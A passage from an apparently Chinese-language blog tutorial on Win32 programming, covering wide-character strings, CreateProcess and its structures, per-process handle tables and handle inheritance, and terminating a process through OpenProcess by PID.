class="line">wprintf(<span class="string">L&quot;%s\n&quot;</span>, wct);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Win32API中的宽字符"><a href="#Win32API中的宽字符" class="headerlink" title="Win32API中的宽字符"></a>Win32API中的宽字符</h1><p>主要存放在<code>C:\Windows\System32</code> （存储的DLL是64位）、<code>C:\Windows\SysWOW64</code>（存储的DLL是32位）下面的所有DLL文件（几千个），没写反，就是反的，32和64，qwq。 重要的DLL文件： </p><ul><li>  Kernel32.dll：最核心的功能模块，例如内存管理、进程线程相关的函数等； </li><li>  User32.dll：Windows用户界面相关的应用程序接口，例如创建窗口、发送信息等； </li><li>  GDI32.dll：全称是Graphical Device Interface（图形设备接口），包含用于画图和显示文本的函数。</li></ul><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401185234453.png" alt="image-20220401185234453"></p><p>win32使用字符串</p><p>字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CHAR strBuff[] = <span class="string">&quot;中国&quot;</span>; <span class="comment">// char</span></span><br><span class="line"></span><br><span class="line">WCHAR strBuff[] = <span class="string">L&quot;中国&quot;</span>; <span class="comment">// wchar_t</span></span><br><span class="line"></span><br><span class="line">TCHAR strBuff[] = TEXT(<span class="string">&quot;中国&quot;</span>); <span class="comment">// TCHAR 根据当前项目的编码自动选择char还是wchar_t，在Win32中推荐使用这种方式</span></span><br></pre></td></tr></table></figure><p>指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PSTR strPoint = <span class="string">&quot;中国&quot;</span>; <span class="comment">// char*</span></span><br><span class="line"></span><br><span class="line">PWSTR strPoint = <span class="string">L&quot;中国&quot;</span>; <span class="comment">// wchar_t*</span></span><br><span class="line"></span><br><span class="line">PTSTR strPoint = TEXT(<span class="string">&quot;中国&quot;</span>); <span class="comment">// PTSTR 根据当前项目的编码自动选择如char*还是wchar_t*，在Win32中推荐使用这种方式</span></span><br></pre></td></tr></table></figure><h1 id="进程的创建"><a href="#进程的创建" class="headerlink" title="进程的创建"></a>进程的创建</h1><p>程序所需要的资源（数据、代码…）是由进程提供的；进程是一种空间上的概念，它的责任就是提供资源，至于资源如何使用，与它无关。</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401190727181.png" alt="image-20220401190727181"></p><p>当我们在Windows下双击打开一个文件，实际上就是<code>explore.exe</code>这个进程创建的我们打开文件的进程，其使用的方法就是：CreateProcess()</p><p>进程创建的过程也就是<strong>CreateProcess函数</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.  映射EXE文件（低2G）</span><br><span class="line">2.  创建内核对象EPROCESS（高2G）(每个进程都有一个)</span><br><span class="line">3.  映射系统DLL（ntdll.dll）（放到用户区）</span><br><span class="line">4.  创建线程内核对象RTHREAD（高2G）(每个进程都有一个)</span><br><span class="line">5.  系统启动线程：</span><br><span class="line">    1.  映射DLL（ntdll.LdrInitializeThunk）</span><br><span class="line">    2.  线程开始执行</span><br></pre></td></tr></table></figure><h1 id="创建进程"><a href="#创建进程" class="headerlink" title="创建进程"></a>创建进程</h1><p>CreateProcess：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpApplicationName,                 <span class="comment">// name of executable module 进程名（完整文件路径）</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPTSTR lpCommandLine,                      <span class="comment">// command line string 命令行传参</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpProcessAttributes, <span class="comment">// SD 进程句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpThreadAttributes,  <span class="comment">// SD 线程句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    BOOL bInheritHandles,                      <span class="comment">// handle inheritance option 句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwCreationFlags,                     <span class="comment">// creation flags 标志</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpEnvironment,                      <span class="comment">// new environment block 父进程环境变量</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpCurrentDirectory,                <span class="comment">// current directory name 父进程目录作为当前目录，设置目录</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPSTARTUPINFO lpStartupInfo,               <span class="comment">// startup information 结构体详细信息（启动进程相关信息）</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPPROCESS_INFORMATION lpProcessInformation <span class="comment">// process information 结构体详细信息（进程ID、线程ID、进程句柄、线程句柄）</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>其中的倒数第一二个参数是结构体，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFOA</span> &#123;</span></span><br><span class="line">  DWORD  cb;<span class="comment">//The size of the structure, in bytes.</span></span><br><span class="line">  LPSTR  lpReserved;</span><br><span class="line">  LPSTR  lpDesktop;</span><br><span class="line">  LPSTR  lpTitle;</span><br><span class="line">  DWORD  dwX;</span><br><span class="line">  DWORD  dwY;</span><br><span class="line">  DWORD  dwXSize;</span><br><span class="line">  DWORD  dwYSize;</span><br><span class="line">  DWORD  dwXCountChars;</span><br><span class="line">  DWORD  dwYCountChars;</span><br><span class="line">  DWORD  dwFillAttribute;</span><br><span class="line">  DWORD  dwFlags;</span><br><span class="line">  WORD   wShowWindow;</span><br><span class="line">  WORD   cbReserved2;</span><br><span class="line">  LPBYTE lpReserved2;</span><br><span class="line">  HANDLE hStdInput;</span><br><span class="line">  HANDLE hStdOutput;</span><br><span class="line">  HANDLE hStdError;</span><br><span class="line">&#125; STARTUPINFOA, *LPSTARTUPINFOA;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESS_INFORMATION</span> &#123;</span></span><br><span class="line">  HANDLE hProcess;</span><br><span class="line">  HANDLE hThread;</span><br><span class="line">  DWORD  dwProcessId;</span><br><span class="line">  DWORD  dwThreadId;</span><br><span class="line">&#125; PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;</span><br></pre></td></tr></table></figure><p>不用管，直接写0就行，而且也差不多可以看懂</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR childProcessName[] = TEXT(<span class="string">&quot;C:/WINDOWS/system32/cmd.exe&quot;</span>);</span><br><span class="line">TCHAR childPeocessCmd[] = TEXT(<span class="string">&quot;/c ping www.baidu.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">STARTUPINFO si;</span><br><span class="line">PROCESS_INFORMATION pi;</span><br><span class="line">ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));</span><br><span class="line"><span class="keyword">if</span> (CreateProcess(childProcessName,</span><br><span class="line">childPeocessCmd,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">FALSE,</span><br><span class="line"><span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;create success\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;CreateProcess Error: %d \n&quot;</span>, GetLastError());<span class="comment">//使用getlasterror获取错误信息</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CloseHandle(pi.hProcess);</span><br><span class="line">CloseHandle(pi.hThread);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="句柄表"><a href="#句柄表" class="headerlink" title="句柄表"></a>句柄表</h1><h2 id="内核对象"><a href="#内核对象" class="headerlink" title="内核对象"></a>内核对象</h2><p>例如进程、线程、文件、互斥体、事件等等在内核都有一个对应的结构体，这些结构体都由内核负责管理，所以我们都可以称之为内核对象。</p><p><strong>CloseHandle</strong>这个API可以关的都是内核对象</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401222824870.png" alt="image-20220401222824870"></p><h2 id="管理内核对象"><a href="#管理内核对象" class="headerlink" title="管理内核对象"></a>管理内核对象</h2><p>当我们使用如下图所示的函数创建时，会在内核层创建一个结构体，而我们该如何管理这些结构体呢？或者说如何使用这些结构体呢？其实很好解决，我们可以通过内核结构体地址来管理，但是这样做存在问题：<strong>应用层很有可能操作不当导致修改啦内核结构体的地址</strong>，我们写应用层代码都知道访问到一个不存在的内存地址就会报错，而如果访问到一个内核地址是错误的，微软系统下则直接会蓝屏。</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401222934940.png" alt="image-20220401222934940"></p><p>这个时候句柄表出现了。</p><p>只有进程才会有句柄表，并且<strong>每一个进程都会有一个句柄表</strong>。</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401223201318.png" alt="image-20220401223201318"></p><p>句柄本质上就一个防火墙，将应用层、内核层隔离开来，通过句柄就可以控制进程内核结构体，我们得到所谓句柄的值实际上就是句柄表里的一个索引。</p><h2 id="多进程共享一个内核对象"><a href="#多进程共享一个内核对象" class="headerlink" title="多进程共享一个内核对象"></a>多进程共享一个内核对象</h2><p>A进程通过<strong>CreateProcess函数</strong>创建了一个内核对象；B进程通过<strong>OpenProcess函数</strong>可以打开别人创建好的一个进程，也就是可以操作其的内核对象；A进程想要操作内核对象就通过其对应的句柄表的句柄（索引）来操作；B进程操作这个内核对象也是通过它自己的句柄表的句柄（索引）来操作内核对象。（需要注意的是：句柄表是一个私有的，句柄值就是进程自己句柄表的索引）</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401231930158.png" alt="image-20220401231930158"></p><p>在之前的例子中我们提到了CloseHandle这个函数是用来关闭进程、线程的，其实它的本质就是释放句柄，但是并不代表执行了这个函数，创建的内核对象就会<strong>彻底消失</strong>；如上图中所示内核对象存在一个计数器，目前是2，它的值是根据调用A的次数来决定的，如果我们只是在A进程中执行了<strong>CloseHandle函数</strong>，内核对象并不会消失，因为进程B还在使用，而只有进程B也执行了<strong>CloseHandle函数</strong>，这个内核对象的计数器为0，就会关闭消失了</p><p><strong>最后</strong>：注意，以上所述特性适合于<strong>除了线程</strong>以外的所有内核对象，创建进程，同时也会创建线程，如果你想把线程关闭，首先需要<strong>CloseHandle函数</strong>要让其计数器为0，其次需要有人将其关闭，所以假设我们创建了一个IE进程打开了一个网站，如果我们只是在代码中使用了<strong>CloseHandle函数</strong>，这样IE浏览器并不会关闭，需要我们手动点击窗口的关闭按钮才行（<strong>只有线程关闭了，进程才会关闭</strong>）。</p><h2 id="句柄是否可以被继承"><a href="#句柄是否可以被继承" class="headerlink" title="句柄是否可以被继承"></a>句柄是否可以被继承</h2><p>除了我们上述的方式可以进行共享内核对象以外，Windows还设计了一种方式来提供我们共享内核对象，我们先来了解一下句柄是否”可以”被继承。</p><p>如下图所示（<strong>句柄表是有三列的，分别是句柄值、内核结构体地址、句柄是否可以被继承</strong>），比如说我们在A进程（父进程）创建了4个内核对象：</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401233035405.png" alt="image-20220401233035405"></p><p>这四个函数都有一个参数<strong>LPSECURITY_ATTRIBUTES lpThreadAttributes</strong>，通过这个参数我们可以判断函数是否创建的是内核对象。</p><p>比如拿CreateEvent来看：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateEventA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPSECURITY_ATTRIBUTES lpEventAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           BOOL                  bManualReset,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           BOOL                  bInitialState,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPCSTR                lpName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>它的第一个参数，其实就是一个结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SECURITY_ATTRIBUTES</span> &#123;</span></span><br><span class="line">  DWORD  nLength;<span class="comment">//长度</span></span><br><span class="line">  LPVOID lpSecurityDescriptor;<span class="comment">//安全描述符</span></span><br><span class="line">  BOOL   bInheritHandle;<span class="comment">//句柄是否被继承，这个是重点被关注的</span></span><br><span class="line">&#125; SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;</span><br></pre></td></tr></table></figure><p>这里使用CreateProcess来看：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateProcessA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPCSTR                lpApplicationName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out, optional] LPSTR                 lpCommandLine,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,<span class="comment">//SD</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,<span class="comment">//SD</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                BOOL                  bInheritHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD                 dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPVOID                lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPCSTR                lpCurrentDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                LPSTARTUPINFOA        lpStartupInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]               LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>有两个LPSECURITY_ATTRIBUTES结构体，一个是进程的，一个是线程的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这种是不被继承</span></span><br><span class="line">CreateProcess(childProcessName,childPeocessCmd,<span class="literal">NULL</span>,<span class="literal">NULL</span>,FALSE,<span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"><span class="comment">//进程句柄，线程句柄都可以被继承</span></span><br><span class="line">SECURITY_ATTRIBUTES sa;</span><br><span class="line">ZeroMemory(&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">sa.nLength = <span class="keyword">sizeof</span>(SECURITY_ATTRIBUTES);</span><br><span class="line">sa.bInheritHandle = <span class="literal">true</span>;</span><br><span class="line">CreateProcess(childProcessName,childPeocessCmd,&amp;sa,&amp;sa,FALSE,<span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br></pre></td></tr></table></figure><h2 id="句柄是否”允许”被继承"><a href="#句柄是否”允许”被继承" class="headerlink" title="句柄是否”允许”被继承"></a>句柄是否”允许”被继承</h2><p>上面是说是否可以被继承，真正继承要另一个参数，还是CreateProcess举例，是<code>bInheritHandles</code>这个参数，这个参数决定了是否允许创建的子进程继承句柄，设置为TRUE时，我们创建的子进程才允许继承父进程的句柄。</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401234807835.png" alt="image-20220401234807835"></p><h1 id="进程相关API"><a href="#进程相关API" class="headerlink" title="进程相关API"></a>进程相关API</h1><p>CreateProcess函数会给我们返回一个结构体，包含四个数据：进程编号（ID）、进程句柄、线程编号（ID）、线程句柄。</p><p>进程ID，通常我们称之为PID，任务管理器中的就是。</p><h2 id="全局句柄表"><a href="#全局句柄表" class="headerlink" title="全局句柄表"></a>全局句柄表</h2><p>每个进程都有一份私有的句柄表，而操作系统也有一份句柄表，我们称之为全局句柄表，这张表里包含了所有正在运行的进程、线程</p><p>PID我们就可以理解为是全局句柄表中的一个索引，那么PID和句柄的区别就很容易看出来来了，<strong>PID是全局的，在任何进程中都有意义，都可以使用，而句柄则是局部的、私有的</strong>；PID是<strong>唯一的，绝对不可能出现重复的存在</strong>，但是当进程消失，那么这个PID就有可能会分给另外一个进程。（<strong>PID不是句柄，但是可以通过PID获得到全局句柄表中其对应的句柄</strong>）</p><p>A程序打开IE，获取PID和句柄：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TCHAR childProcessName[] = TEXT(<span class="string">&quot;C:\\Program Files\\Internet Explorer\\iexplore.exe&quot;</span>);</span><br><span class="line">    TCHAR childPeocessCmd[] = TEXT(<span class="string">&quot;http://www.baidu.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">    STARTUPINFO si;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">    ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));</span><br><span class="line">    <span class="keyword">if</span> (CreateProcess(childProcessName,</span><br><span class="line">                      childPeocessCmd,</span><br><span class="line">                      <span class="literal">NULL</span>,</span><br><span class="line">                      <span class="literal">NULL</span>,</span><br><span class="line">                      FALSE,</span><br><span class="line">                      <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;create success\nPID:%d, 句柄:%d&quot;</span>, pi.dwProcessId, pi.hProcess);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateProcess Error: %d \n&quot;</span>, GetLastError());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    CloseHandle(pi.hProcess);</span><br><span class="line">    CloseHandle(pi.hThread);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后B使用TerminateProcess函数来终止A进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TerminateProcess函数</span></span><br><span class="line"><span class="function">BOOL <span class="title">TerminateProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hProcess, <span class="comment">// handle to the process 句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  UINT uExitCode   <span class="comment">// exit code for the process 退出代码</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hProcess;</span><br><span class="line">    hProcess = (HANDLE)<span class="number">0x1b0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!TerminateProcess(hProcess, <span class="number">1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;终止失败,%d\n&quot;</span>, GetLastError());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看见是失败，6，句柄无效，真正的关闭这个进程，那就需要借助PID来获取句柄：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">OpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwDesiredAccess,  <span class="comment">// access flag 你希望的访问权限,https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights</span></span></span></span><br><span class="line"><span class="params"><span class="function">  BOOL bInheritHandle,    <span class="comment">// handle inheritance option 是否可以被继承</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwProcessId       <span class="comment">// process identifier 进程ID</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hProcess;</span><br><span class="line">    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, <span class="number">0x4598</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!TerminateProcess(hProcess, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;终止进程失败：%d \n&quot;</span>, GetLastError());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行之后发现iE关了。</p><h2 id="以挂起的形式创建进程"><a href="#以挂起的形式创建进程" class="headerlink" title="以挂起的形式创建进程"></a>以挂起的形式创建进程</h2><p>还是CreateProcess，第六个参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpApplicationName,                 <span class="comment">// name of executable module</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPTSTR lpCommandLine,                      <span class="comment">// command line string</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpProcessAttributes, <span class="comment">// SD</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpThreadAttributes,  <span class="comment">// SD</span></span></span></span><br><span class="line"><span class="params"><span class="function">  BOOL bInheritHandles,                      <span class="comment">// handle inheritance option</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwCreationFlags,                     <span class="comment">// creation flags &lt;--这个参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPVOID lpEnvironment,                      <span class="comment">// new environment block</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpCurrentDirectory,                <span class="comment">// current directory name</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPSTARTUPINFO lpStartupInfo,               <span class="comment">// startup information</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPPROCESS_INFORMATION lpProcessInformation <span class="comment">// process information</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    TCHAR childProcessName[] = TEXT(<span class="string">&quot;C:/WINDOWS/system32/cmd.exe&quot;</span>);</span><br><span class="line">    TCHAR childPeocessCmd[] = TEXT(<span class="string">&quot;/c ping www.baidu.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">(CreateProcess(childProcessName,childPeocessCmd,  <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE,CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>写<code>CREATE_NEW_CONSOLE</code>就会在新的终端打开，不然就是本终端打开。</p><p>但是我们关注的是另一个，有意义的，<code>CREATE_SUSPENDED</code></p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image2021-5-22_1-12-9.png"></p><p>释放使用resumeThread</p><h2 id="模块目录和工作目录"><a href="#模块目录和工作目录" class="headerlink" 